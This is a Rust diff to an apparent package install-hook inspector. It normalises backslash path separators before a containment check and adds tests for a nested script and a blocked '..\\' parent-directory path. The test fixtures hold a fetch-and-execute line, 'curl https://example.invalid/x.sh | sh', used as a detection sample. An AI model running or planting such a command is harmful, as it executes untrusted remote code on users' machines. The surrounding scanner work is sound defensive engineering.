@@ -739,11 +739,18 @@ fn script_body<'a>(manifest: &'a Value, name: &str) -> Option<&'a str> {
         .and_then(Value::as_str)
 }
 
+/// Hook text may use `\` as a separator. `Path` on Unix keeps that character
+/// inside one component, so the same script would name a different file there.
+fn portable_relative(rel: &str) -> String {
+    rel.replace('\\', "/")
+}
+
 fn read_contained(package_dir: &Path, canonical_root: &Path, rel: &str) -> Result<String, String> {
-    if let Some(reason) = structural_escape(rel) {
+    let rel = portable_relative(rel);
+    if let Some(reason) = structural_escape(&rel) {
         return Err(reason.to_owned());
     }
-    let path = package_dir.join(rel);
+    let path = package_dir.join(&rel);
     let metadata = fs::symlink_metadata(&path).map_err(|err| {
         if err.kind() == io::ErrorKind::NotFound {
             "file not found".to_owned()
@@ -1000,6 +1007,34 @@ mod tests {
         assert!(
             extra.contains("curl https://example.invalid/x.sh | sh"),
             "local .\\husky was not read: {extra}"
+        );
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn backslash_nested_script_is_read() {
+        let root = temp_package("nested-bs");
+        write_payload(&root, "dir/script.js");
+        let (disposition, extra, warnings) = resolve_at(&root, r"dir\script.js");
+        assert_eq!(disposition, HookDisposition::Inspected, "{warnings:?}");
+        assert!(
+            extra.contains("curl https://example.invalid/x.sh | sh"),
+            "dir\\script.js was not read: {extra}"
+        );
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn backslash_parent_script_stays_blocked() {
+        let root = temp_package("outside-bs");
+        let (disposition, extra, warnings) = resolve_at(&root, r"..\outside.js");
+        assert_eq!(disposition, HookDisposition::Unverified, "{warnings:?}");
+        assert!(extra.is_empty(), "{extra}");
+        assert!(
+            warnings
+                .iter()
+                .any(|warning| warning.contains("parent directory")),
+            "{warnings:?}"
         );
         let _ = fs::remove_dir_all(&root);
     }
